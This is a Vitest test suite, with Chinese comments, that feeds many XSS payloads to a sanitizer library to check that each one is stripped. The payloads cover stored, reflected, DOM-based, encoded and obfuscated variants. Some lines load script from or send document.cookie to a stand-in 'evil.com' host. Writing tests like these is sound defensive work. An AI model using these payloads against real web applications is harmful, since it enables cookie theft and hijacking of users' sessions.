/**
 * XSS 攻击场景测试套件
 * 测试跨站脚本攻击的各种变体和防护措施
 */

import { describe, test, expect, beforeEach } from "vitest"
import { AdvancedXSSCleaner, ContentValidator, InputSanitizer } from "@/lib/security/xss-cleaner"

describe("XSS 攻击场景测试", () => {
  beforeEach(() => {
    // 确保每次测试都是独立的
    console.log("Testing XSS attack scenarios...")
  })

  describe("存储型 XSS 攻击", () => {
    test("应该防止脚本注入到数据库存储", () => {
      const storedXSSPayloads = [
        // 基础脚本注入
        '<script>alert("Stored XSS")</script>',
        '<script>document.cookie="stolen=true"</script>',
        '<script src="http://evil.com/xss.js"></script>',

        // HTML5 新标签攻击
        '<audio src="x" onerror="alert(1)">',
        '<video src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
        '<source src="x" onerror="alert(1)">',
        '<track src="x" onerror="alert(1)">',

        // 数据URI攻击
        '<img src="data:text/html,<script>alert(1)</script>">',
        '<object data="data:text/html,<script>alert(1)</script>">',
        '<embed src="data:text/html,<script>alert(1)</script>">',

        // SVG XSS攻击
        '<svg onload="alert(1)">',
        "<svg><script>alert(1)</script></svg>",
        "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",

        // 表单相关XSS
        '<form><button formaction="javascript:alert(1)">Click</button></form>',
        '<input type="image" src="x" onerror="alert(1)">',
        '<textarea onfocus="alert(1)" autofocus>',

        // 样式表XSS
        '<style>body{background:url("javascript:alert(1)")}</style>',
        '<div style="background-image:url(javascript:alert(1))">',
        '<link rel="stylesheet" href="javascript:alert(1)">',
      ]

      for (const payload of storedXSSPayloads) {
        const cleaned = AdvancedXSSCleaner.deepSanitizeHTML(payload)

        // 验证所有脚本执行载荷被移除
        expect(cleaned).not.toMatch(/<script[\s\S]*?>[\s\S]*?<\/script>/i)
        expect(cleaned).not.toContain("javascript:")
        expect(cleaned).not.toMatch(/on\w+\s*=/i)
        expect(cleaned).not.toContain("alert(")
        expect(cleaned).not.toContain("eval(")
        expect(cleaned).not.toContain("document.cookie")

        // 验证数据URI被安全化
        expect(cleaned).not.toMatch(/data:[^,]*text\/html/i)
        expect(cleaned).not.toMatch(/data:[^,]*application\//i)

        console.log(`存储型XSS测试 - 原始: ${payload.substring(0, 50)}...`)
        console.log(`清理后: ${cleaned.substring(0, 100)}...`)
      }
    })

    test("应该处理复杂嵌套和编码攻击", () => {
      const complexPayloads = [
        // 多重编码攻击
        "&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;",
        "%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E",
        "&#60;script&#62;alert(&#39;XSS&#39;)&#60;/script&#62;",

        // 混合编码
        "&lt;img src=x onerror=&quot;alert(1)&quot;&gt;",
        "%3Cimg%20src%3Dx%20onerror%3D%22alert(1)%22%3E",

        // Unicode编码攻击
        '<img src=x onerror="&#97;lert(1)">',
        '<svg onload="&#x61;lert(1)">',

        // 双重编码
        "%253Cscript%253Ealert%2528%2522XSS%2522%2529%253C%252Fscript%253E",

        // 换行和空格绕过
        '<script\nsrc="http://evil.com/xss.js"></script>',
        '<img\tsrc="x"\nonerror="alert(1)">',
        '<svg\r\nonload="alert(1)">',

        // 注释绕过
        "<script>/*comment*/alert(1)/*comment*/</script>",
        '<img src="x" onerror="al/*comment*/ert(1)">',

        // 大小写混合绕过
        "<ScRiPt>AlErT(1)</ScRiPt>",
        '<IMG SRC="x" ONERROR="ALERT(1)">',

        // 深度嵌套
        '<div><span><img src="x" onerror="alert(1)"></span></div>',
        "<p><em><strong><script>alert(1)</script></strong></em></p>",
      ]

      for (const payload of complexPayloads) {
        const cleaned = AdvancedXSSCleaner.deepSanitizeHTML(payload)

        // 验证清理后的内容
        const validation = ContentValidator.validateContent(cleaned)

        expect(validation.isValid).toBe(true)
        expect(cleaned).not.toMatch(/script/i)
        expect(cleaned).not.toMatch(/on\w+\s*=/i)
        expect(cleaned).not.toContain("alert(")

        console.log(`复杂XSS测试 - 清理状态: ${validation.isValid ? "✅" : "❌"}`)
      }
    })
  })

  describe("反射型 XSS 攻击", () => {
    test("应该清理URL参数中的XSS载荷", () => {
      const reflectedPayloads = [
        // URL参数注入
        'search=<script>alert("Reflected XSS")</script>',
        'q="><script>alert(1)</script>',
        "redirect=javascript:alert(1)",

        // 表单数据反射
        'username=<img src="x" onerror="alert(1)">',
        'message=<svg onload="alert(1)">',
        'comment=<body onload="alert(1)">',

        // 错误页面反射
        'error=<script>window.location="http://evil.com?cookie="+document.cookie</script>',
        '404=<iframe src="javascript:alert(1)"></iframe>',

        // 搜索结果反射
        'query=<details open ontoggle="alert(1)">',
        'term=<marquee onstart="alert(1)">',

        // JSON反射攻击
        'data={"xss":"<script>alert(1)</script>"}',
        "json=</script><script>alert(1)</script>",
      ]

      for (const payload of reflectedPayloads) {
        // 模拟URL参数处理
        const paramValue = payload.split("=")[1] || payload
        const cleaned = InputSanitizer.sanitizeUserInput(paramValue, "html")

        if (cleaned !== null) {
          const validation = ContentValidator.validateContent(cleaned)
          expect(validation.isValid).toBe(true)

          // 验证反射型攻击载荷被清理
          expect(cleaned).not.toMatch(/<script[\s\S]*?<\/script>/i)
          expect(cleaned).not.toMatch(/on\w+\s*=/i)
          expect(cleaned).not.toContain("javascript:")
          expect(cleaned).not.toMatch(/<iframe/i)
          expect(cleaned).not.toContain("alert(")
        }

        console.log(`反射型XSS测试 - 参数: ${paramValue}`)
        console.log(`清理结果: ${cleaned || "NULL"}`)
      }
    })

    test("应该处理HTTP头部XSS注入", () => {
      const headerXSSPayloads = [
        // User-Agent注入
        'Mozilla/5.0 <script>alert("XSS")</script>',
        'Chrome/90.0 "><script>alert(1)</script>',

        // Referer注入
        "http://evil.com/<script>alert(1)</script>",
        'https://site.com/page?xss=<img src="x" onerror="alert(1)">',

        // Cookie注入
        "sessionid=abc123; xss=<script>alert(1)</script>",
        'user=admin"><script>alert(1)</script>',

        // 自定义头部注入
        "X-Forwarded-For: 192.168.1.1<script>alert(1)</script>",
        'X-Real-IP: 127.0.0.1"><svg onload="alert(1)">',
      ]

      for (const payload of headerXSSPayloads) {
        const cleaned = InputSanitizer.sanitizeUserInput(payload, "text")

        if (cleaned !== null) {
          // HTTP头部应该被清理为纯文本
          expect(cleaned).not.toContain("<")
          expect(cleaned).not.toContain(">")
          expect(cleaned).not.toContain("script")
          expect(cleaned).not.toContain("alert(")
          expect(cleaned.length).toBeLessThanOrEqual(1000) // 限制长度
        }

        console.log(`头部XSS测试 - 清理结果: ${cleaned || "NULL"}`)
      }
    })
  })

  describe("DOM型 XSS 攻击", () => {
    test("应该防止客户端DOM操作XSS", () => {
      const domXSSPatterns = [
        // innerHTML攻击模式
        '<div>User input: <script>alert("DOM XSS")</script></div>',
        '<span id="output"><img src="x" onerror="alert(1)"></span>',

        // jQuery攻击模式
        '<div data-content="<script>alert(1)</script>">',
        '<p class="output"><svg onload="alert(1)">',

        // 事件处理器注入
        "<button onclick=\"userFunction('<script>alert(1)</script>')\">",
        '<a href="#" data-action="<img src=x onerror=alert(1)>">',

        // 模板注入
        "{{<script>alert(1)</script>}}",
        '${<img src="x" onerror="alert(1)">}',

        // 属性注入
        '<div title="<script>alert(1)</script>">',
        '<img alt="<svg onload=alert(1)>">',
      ]

      for (const pattern of domXSSPatterns) {
        const cleaned = AdvancedXSSCleaner.deepSanitizeHTML(pattern, {
          allowHtml: true,
          removeScripts: true,
          removeStyles: true,
          removeLinks: false,
          maxLength: 5000,
          customFilters: [
            // 额外过滤器模拟DOM XSS防护
            (text) => text.replace(/\{\{.*?\}\}/g, ""), // 移除模板语法
            (text) => text.replace(/\$\{.*?\}/g, ""), // 移除ES6模板字符串
          ],
        })

        const validation = ContentValidator.validateContent(cleaned)

        expect(validation.isValid).toBe(true)
        expect(cleaned).not.toMatch(/<script/i)
        expect(cleaned).not.toMatch(/on\w+\s*=/i)
        expect(cleaned).not.toContain("alert(")
        expect(cleaned).not.toMatch(/\{\{.*?\}\}/) // 模板语法应被移除
        expect(cleaned).not.toMatch(/\$\{.*?\}/) // ES6模板应被移除

        console.log(`DOM XSS测试 - 验证通过: ${validation.isValid}`)
      }
    })

    test("应该处理动态内容生成XSS", () => {
      // 模拟动态生成内容的场景
      const dynamicContents = [
        {
          template: '<div class="user-bio">{USER_BIO}</div>',
          userInput: '<script>alert("Bio XSS")</script>',
          expected: '<div class="user-bio">alert("Bio XSS")</div>',
        },
        {
          template: '<img src="{USER_AVATAR}" alt="Avatar">',
          userInput: 'x" onerror="alert(1)"',
          expected: '<img src="x&quot; onerror=&quot;alert(1)&quot;" alt="Avatar">',
        },
        {
          template: '<a href="{USER_WEBSITE}">Website</a>',
          userInput: "javascript:alert(1)",
          expected: '<a href="blocked:alert(1)">Website</a>',
        },
        {
          template: '<span title="{USER_STATUS}">{USER_NAME}</span>',
          userInput: '"><script>alert(1)</script><"',
          expected: '<span title="&quot;&gt;alert(1)&lt;&quot;">',
        },
      ]

      for (const { template, userInput, expected } of dynamicContents) {
        // 清理用户输入
        const cleanedInput = AdvancedXSSCleaner.deepSanitizeHTML(userInput)

        // 模拟模板渲染
        const rendered = template.replace(/\{[^}]+\}/g, cleanedInput)

        // 再次清理渲染结果
        const finalContent = AdvancedXSSCleaner.deepSanitizeHTML(rendered)

        const validation = ContentValidator.validateContent(finalContent)

        expect(validation.isValid).toBe(true)
        expect(finalContent).not.toContain("<script>")
        expect(finalContent).not.toMatch(/on\w+\s*=/i)
        expect(finalContent).not.toContain("javascript:")

        console.log(`动态内容XSS测试:`)
        console.log(`  输入: ${userInput}`)
        console.log(`  输出: ${finalContent}`)
        console.log(`  安全: ${validation.isValid ? "✅" : "❌"}`)
      }
    })
  })

  describe("过滤器绕过攻击", () => {
    test("应该防止标签闭合绕过", () => {
      const bypassAttempts = [
        // 标签闭合绕过
        "</script><script>alert(1)</script>",
        "</style><script>alert(1)</script>",
        "</textarea><script>alert(1)</script>",
        "</title><script>alert(1)</script>",

        // 属性闭合绕过
        '" onload="alert(1)"',
        '\' onerror="alert(1)"',
        "> <script>alert(1)</script>",

        // HTML实体绕过
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",

        // 零宽字符绕过
        "<scri\u200Bpt>alert(1)</scri\u200Bpt>",
        '<img src=x onerr\u200Bor="alert(1)">',

        // 大小写混合绕过
        "<ScRiPt>alert(1)</ScRiPt>",
        '<IMG SRC=x OnErRoR="alert(1)">',
      ]

      for (const attempt of bypassAttempts) {
        const cleaned = AdvancedXSSCleaner.deepSanitizeHTML(attempt)
        const validation = ContentValidator.validateContent(cleaned)

        expect(validation.isValid).toBe(true)

        // 验证绕过尝试失败
        expect(cleaned).not.toMatch(/<script/i)
        expect(cleaned).not.toMatch(/on\w+\s*=/i)
        expect(cleaned).not.toContain("alert(")
        expect(cleaned).not.toMatch(/javascript:/i)

        console.log(
          `绕过防护测试 - ${attempt.substring(0, 30)}... => ${validation.isValid ? "阻止成功" : "绕过成功"}`
        )
      }
    })

    test("应该处理变形和混淆攻击", () => {
      const obfuscatedPayloads = [
        // 字符串拼接混淆
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        '<script>window["al"+"ert"](1)</script>',

        // Base64编码混淆
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        '<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">',

        // 十六进制编码
        '<script>eval("\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29")</script>',

        // Unicode编码
        "<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>",

        // 正则表达式混淆
        '<script>/alert/.source.constructor("return process")().exit()</script>',

        // 模板字符串混淆
        "<script>`${`${`${alert(1)}`}`}`</script>",

        // 函数构造器混淆
        '<script>Function("a","return a")("alert(1)")</script>',
        '<script>[].constructor.constructor("alert(1)")()</script>',
      ]

      for (const payload of obfuscatedPayloads) {
        const cleaned = AdvancedXSSCleaner.deepSanitizeHTML(payload)
        const validation = ContentValidator.validateContent(cleaned)

        expect(validation.isValid).toBe(true)

        // 验证混淆攻击被阻止
        expect(cleaned).not.toMatch(/<script/i)
        expect(cleaned).not.toContain("eval(")
        expect(cleaned).not.toContain("Function(")
        expect(cleaned).not.toContain("constructor")
        expect(cleaned).not.toContain("fromCharCode")
        expect(cleaned).not.toContain("atob(")

        console.log(`混淆攻击测试 - 载荷长度: ${payload.length}, 清理后: ${cleaned.length}`)
      }
    })
  })

  describe("上下文相关XSS测试", () => {
    test("应该根据上下文调整清理策略", () => {
      const contextTests = [
        {
          context: "html_content",
          input: "<p>Hello <strong>World</strong></p><script>alert(1)</script>",
          expectedTags: ["<p>", "<strong>"],
          forbiddenTags: ["<script>"],
        },
        {
          context: "html_attribute",
          input: 'value" onload="alert(1)"',
          expectedContent: "value",
          forbiddenContent: ["onload", "alert("],
        },
        {
          context: "javascript_string",
          input: '"; alert(1); var x="',
          expectedEscaping: true,
          forbiddenContent: ["alert(", '";'],
        },
        {
          context: "css_value",
          input: 'red; background: url("javascript:alert(1)")',
          expectedContent: "red",
          forbiddenContent: ["javascript:", "url("],
        },
        {
          context: "url_parameter",
          input: "search?q=<script>alert(1)</script>",
          expectedEncoding: true,
          forbiddenContent: ["<script>", "alert("],
        },
      ]

      for (const {
        context,
        input,
        expectedTags,
        forbiddenTags,
        forbiddenContent,
        expectedContent,
      } of contextTests) {
        let cleaned: string | null

        switch (context) {
          case "html_content":
            cleaned = AdvancedXSSCleaner.deepSanitizeHTML(input)
            break
          case "html_attribute":
          case "javascript_string":
          case "css_value":
            cleaned = InputSanitizer.sanitizeUserInput(input, "text")
            break
          case "url_parameter":
            cleaned = InputSanitizer.sanitizeUserInput(input, "url")
            break
          default:
            cleaned = InputSanitizer.sanitizeUserInput(input, "text")
        }

        if (cleaned !== null) {
          // 验证期望的内容保留
          if (expectedTags) {
            expectedTags.forEach((tag) => {
              expect(cleaned).toContain(tag.replace(/[<>]/g, ""))
            })
          }

          if (expectedContent) {
            expect(cleaned).toContain(expectedContent)
          }

          // 验证危险内容被移除
          if (forbiddenTags) {
            forbiddenTags.forEach((tag) => {
              expect(cleaned).not.toContain(tag)
            })
          }

          if (forbiddenContent) {
            forbiddenContent.forEach((content) => {
              expect(cleaned).not.toContain(content)
            })
          }

          console.log(`上下文XSS测试 [${context}]:`)
          console.log(`  输入: ${input}`)
          console.log(`  输出: ${cleaned}`)
        }
      }
    })
  })

  describe("性能和资源攻击", () => {
    test("应该防止通过超长内容进行DoS攻击", () => {
      const longContent = "<p>" + "A".repeat(100000) + "</p>"
      const veryLongContent = "<div>" + "B".repeat(500000) + "</div>"

      expect(() => {
        AdvancedXSSCleaner.deepSanitizeHTML(longContent)
      }).not.toThrow()

      expect(() => {
        AdvancedXSSCleaner.deepSanitizeHTML(veryLongContent)
      }).not.toThrow() // 应该被截断而不是抛出异常

      const cleaned = AdvancedXSSCleaner.deepSanitizeHTML(veryLongContent)
      expect(cleaned.length).toBeLessThanOrEqual(50000) // 应该被限制长度
    })

    test("应该防止复杂嵌套导致的性能问题", () => {
      // 创建深度嵌套的HTML
      let deeplyNested = ""
      const depth = 100

      for (let i = 0; i < depth; i++) {
        deeplyNested += `<div class="level-${i}">`
      }
      deeplyNested += '<script>alert("Deep XSS")</script>'
      for (let i = 0; i < depth; i++) {
        deeplyNested += "</div>"
      }

      const startTime = Date.now()
      const cleaned = AdvancedXSSCleaner.deepSanitizeHTML(deeplyNested)
      const endTime = Date.now()

      const processingTime = endTime - startTime

      // 验证处理时间合理（不超过100ms）
      expect(processingTime).toBeLessThan(100)

      // 验证恶意脚本被移除
      expect(cleaned).not.toContain("<script>")
      expect(cleaned).not.toContain("alert(")

      console.log(`深度嵌套测试 - 处理时间: ${processingTime}ms, 嵌套深度: ${depth}`)
    })
  })
})
